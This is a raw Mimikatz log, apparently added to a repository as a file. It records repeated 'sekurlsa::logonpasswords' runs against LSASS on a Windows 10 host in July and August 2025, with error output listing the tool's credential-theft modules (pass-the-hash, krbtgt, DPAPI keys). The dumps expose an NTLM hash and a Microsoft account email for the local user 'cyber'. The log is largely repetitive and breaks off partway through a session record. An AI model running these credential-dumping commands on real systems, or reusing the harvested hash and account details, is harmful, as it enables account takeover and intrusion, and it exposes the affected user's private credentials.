+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz #  sekurlsa::logonpasswords
+ERROR mimikatz_doLocal ; "" command of "standard" module not found !
+
+Module :	standard
+Full name :	Standard module
+Description :	Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # version
+
+mimikatz 2.2.0 (arch x64)
+Windows NT 10.0 build 19045 (arch x64)
+msvc 150030729 207
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logpasswords
+ERROR mimikatz_doLocal ; "logpasswords" command of "sekurlsa" module not found !
+
+Module :	sekurlsa
+Full name :	SekurLSA module
+Description :	Some commands to enumerate credentials...
+
+             msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
+             pth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+mimikatz # Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logpasswords
+ERROR mimikatz_doLocal ; "logpasswords" command of "sekurlsa" module not found !
+
+Module :	sekurlsa
+Full name :	SekurLSA module
+Description :	Some commands to enumerate credentials...
+
+             msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
+             pth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+mimikatz # sekurl::logpasswords
+ERROR mimikatz_doLocal ; "sekurl" module not found !
+
+        standard  -  Standard module  [Basic commands (does not require module name)]
+          crypto  -  Crypto Module
+        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
+        kerberos  -  Kerberos package module  []
+       privilege  -  Privilege module
+         process  -  Process module
+         service  -  Service module
+         lsadump  -  LsaDump module
+              ts  -  Terminal Server module
+           event  -  Event module
+            misc  -  Miscellaneous module
+           token  -  Token manipulation module
+           vault  -  Windows Vault/Credential module
+     minesweeper  -  MineSweeper module
+             net  -  
+           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
+       busylight  -  BusyLight Module
+          sysenv  -  System Environment Value module
+             sid  -  Security Identifiers module
+             iis  -  IIS XML Config module
+             rpc  -  RPC control of mimikatz
+            sr98  -  RF module for SR98 device and T5577 target
+             rdm  -  RF module for RDM(830 AL) device
+             acr  -  ACR Module
+
+mimikatz # sekurlsa::logpasswords
+ERROR mimikatz_doLocal ; "logpasswords" command of "sekurlsa" module not found !
+
+Module :	sekurlsa
+Full name :	SekurLSA module
+Description :	Some commands to enumerate credentials...
+
+             msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
+             pth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 424022 (00000000:00067856)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:19:09 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 423968 (00000000:00067820)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:19:09 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 56199 (00000000:0000db87)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:10 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 56183 (00000000:0000db77)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:10 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:10 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:08 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32749 (00000000:00007fed)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:07 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32715 (00000000:00007fcb)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:07 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 31585 (00000000:00007b61)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:06 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:06 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 424022 (00000000:00067856)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:19:09 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 423968 (00000000:00067820)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:19:09 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 56199 (00000000:0000db87)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:10 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 56183 (00000000:0000db77)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:10 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/1/2025 9:17:10 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
